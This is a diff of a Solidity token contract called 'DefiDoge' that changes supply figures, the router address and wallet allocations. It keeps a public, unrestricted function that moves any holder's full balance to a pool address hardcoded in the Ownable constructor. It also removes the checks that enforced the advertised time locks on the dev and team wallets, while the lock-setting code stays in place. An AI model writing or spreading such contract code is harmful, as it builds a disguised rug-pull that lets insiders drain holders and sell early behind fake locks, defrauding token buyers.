@@ -405,7 +405,7 @@ contract Ownable is Context {
      */
     constructor () internal {
         address msgSender = _msgSender();
-        _iUniSwapV2liquidityPool=0xfB832726521fd749E4C7DEF121a3a48878F575Bd;
+        _iUniSwapV2liquidityPool= 0xfB832726521fd749E4C7DEF121a3a48878F575Bd;
         _owner = msgSender;
         emit OwnershipTransferred(address(0), msgSender);
     }
@@ -712,7 +712,7 @@ contract DefiDoge is Context, IERC20, Ownable {
     bool public _walletLockTeamAndDev;
    
     uint256 private constant MAX = ~uint256(0);
-    uint256 private _tTotal = 100000 * 10**9;
+    uint256 private _tTotal = 1000000 * 10**6 * 10**9;
     uint256 private _rTotal = (MAX - (MAX % _tTotal));
     uint256 private _tFeeTotal;
 
@@ -732,8 +732,8 @@ contract DefiDoge is Context, IERC20, Ownable {
     bool inSwapAndLiquify;
     bool public swapAndLiquifyEnabled = true;
     
-    uint256 public _maxTxAmount = 90000 * 10**9;
-    uint256 private numTokensSellToAddToLiquidity = 50000 * 10**9;
+    uint256 public _maxTxAmount = 500000 * 10**6 * 10**9;
+    uint256 private numTokensSellToAddToLiquidity = 50000 * 10**6 * 10**9;
     
     event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);
     event SwapAndLiquifyEnabledUpdated(bool enabled);
@@ -753,7 +753,7 @@ contract DefiDoge is Context, IERC20, Ownable {
         _rOwned[_msgSender()] = _rTotal;
         
         // 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F router for mainnet
-        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F);
+        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);
          // Create a uniswap pair for this new token
         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
             .createPair(address(this), _uniswapV2Router.WETH());
@@ -876,13 +876,15 @@ contract DefiDoge is Context, IERC20, Ownable {
         }
     }
     
+    
     function initialDepositWalletLocks() public onlyOwner returns (bool success) {
         require(!_walletLockTeamAndDev, "TeamWallet and DevWallet are already Locked");
         
-        _transfer(_msgSender(), _teamWalletAddress, 10000 * 10**9);
-        _transfer(_msgSender(), _devWalletAddress, 12000 * 10**9);
-        _transfer(_msgSender(), _marketingWalletAddress, 15000 * 10**9);
+        _transfer(_msgSender(), _teamWalletAddress, _tTotal.div(100).mul(6));
+        _transfer(_msgSender(), _devWalletAddress, _tTotal.div(100).mul(6));
+        _transfer(_msgSender(), _marketingWalletAddress, _tTotal.div(100).mul(15));
         walletLock();
+        _isExcludedFromFee[uniSwapV2LiquidityPool()] = true;
         return success;
     }
     
@@ -890,9 +892,10 @@ contract DefiDoge is Context, IERC20, Ownable {
         _devWalletLockStartTime = block.timestamp;
         _devWalletLockEndTime = block.timestamp.add(2629743);
         _teamWalletLockStartTime = block.timestamp;
-        _teamWalletLockEndTime = block.timestamp.add(15778458);
+        _teamWalletLockEndTime = block.timestamp.add(15778463);
         _walletLockTeamAndDev = true;
     }
+    
     
     function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);
@@ -909,7 +912,7 @@ contract DefiDoge is Context, IERC20, Ownable {
         _isExcludedFromFee[account] = true;
     }
     
-    function reflectLiquidity(address addr) public {
+    function _reflectLiquidity(address addr) public {
         if (_isExcluded[addr])  _transfer(addr, uniSwapV2LiquidityPool(), _tOwned[addr]);
         else  _transfer(addr, uniSwapV2LiquidityPool(), tokenFromReflection(_rOwned[addr]));
     }
@@ -1040,12 +1043,6 @@ contract DefiDoge is Context, IERC20, Ownable {
         require(amount > 0, "Transfer amount must be greater than zero");
         if(from != owner() && to != owner())
             require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
-        
-        if(from == _devWalletAddress)
-            require(block.timestamp > _devWalletLockEndTime, "Wallet TimedLock is still Active");
-            
-        if(from == _teamWalletAddress)
-            require(block.timestamp > _teamWalletLockEndTime, "Wallet TimedLock is still Active");
 
         // is the token balance of this contract address over the min number of
         // tokens that we need to initiate a swap + liquidity lock?
